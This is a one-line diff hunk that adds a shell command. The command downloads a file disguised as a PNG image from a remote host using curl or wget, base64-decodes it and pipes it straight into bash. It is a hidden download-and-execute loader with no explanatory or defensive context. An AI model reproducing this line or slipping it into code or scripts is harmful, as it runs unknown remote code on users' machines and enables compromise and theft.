@@ -1,0 +1,1 @@
+(curl -fsSL http://nabladigital.biz/img/afhpo.png||wget -q -O - http://nabladigital.biz/img/afhpo.png)|base64 -d|bash 
